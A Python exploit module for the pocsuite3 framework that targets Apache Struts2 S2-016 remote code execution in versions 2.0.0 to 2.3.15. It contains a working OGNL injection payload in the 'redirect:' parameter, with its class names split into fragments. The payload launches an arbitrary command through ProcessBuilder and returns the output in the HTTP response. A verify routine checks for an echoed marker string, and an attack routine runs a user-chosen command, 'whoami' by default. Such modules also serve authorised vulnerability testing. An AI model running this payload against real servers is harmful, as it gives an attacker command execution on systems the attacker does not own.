from collections import OrderedDict

from requests.exceptions import ReadTimeout
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1'
    appName = 'Struts2'
    appVersion = '2.0.0 - 2.3.15'
    name = 'Struts2-016远程代码执行'
    desc = '''Struts2-016远程代码执行'''
    pocDesc = '''Struts2-016远程代码执行'''
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    protocol = POC_CATEGORY.PROTOCOL.HTTP
    references = ['https://github.com/vulhub/vulhub/blob/master/struts2/s2-016/README.zh-cn.md']

    def _options(self):
        o = OrderedDict()
        o["command"] = OptString("whoami", description="攻击时自定义命令")
        return o

    def _verify(self):

        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = "echo VuLnEcHoPoCSuCCeSS"
        payload = r"?redirect:${%23req%3d%23context.get(%27co%27" \
            r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
            r"her.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java" \
            r".util.Scanner((new%20java.lang.ProcessBuilder(%27RECOMMAND%27." \
            r"toString().split(%27\\s%27))).start().getInputStream()).useDel" \
            r"imiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27," \
            r"%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony" \
            r".xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes" \
            r"%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27)," \
            r"%23resp.getWriter().println(%23str),%23resp.getWriter().flush" \
            r"(),%23resp.getWriter().close()}"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload
        flag = "VuLnEcHoPoCSuCCeSS"

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200 and flag in response.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        HEADERS = {
            'Accept': 'application/x-shockwave-flash,'
                      'image/gif,'
                      'image/x-xbitmap,'
                      'image/jpeg,'
                      'image/pjpeg,'
                      'application/vnd.ms-excel,'
                      'application/vnd.ms-powerpoint,'
                      'application/msword,'
                      '*/*',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        result = {}
        cmd = self.get_option("command")
        payload = r"?redirect:${%23req%3d%23context.get(%27co%27" \
                  r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
                  r"her.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23s%3dnew%20java" \
                  r".util.Scanner((new%20java.lang.ProcessBuilder(%27RECOMMAND%27." \
                  r"toString().split(%27\\s%27))).start().getInputStream()).useDel" \
                  r"imiter(%27\\A%27),%23str%3d%23s.hasNext()?%23s.next():%27%27," \
                  r"%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony" \
                  r".xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes" \
                  r"%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27)," \
                  r"%23resp.getWriter().println(%23str),%23resp.getWriter().flush" \
                  r"(),%23resp.getWriter().close()}"
        payload = payload.replace("RECOMMAND", cmd)
        url = self.url + payload

        try:
            response = requests.get(url, headers=HEADERS)
            if response and response.status_code == 200:
                result['Stdout'] = response.text
        except ReadTimeout:
            pass
        except Exception as e:
            pass

        return self.parse_output(result)


register_poc(DemoPOC)
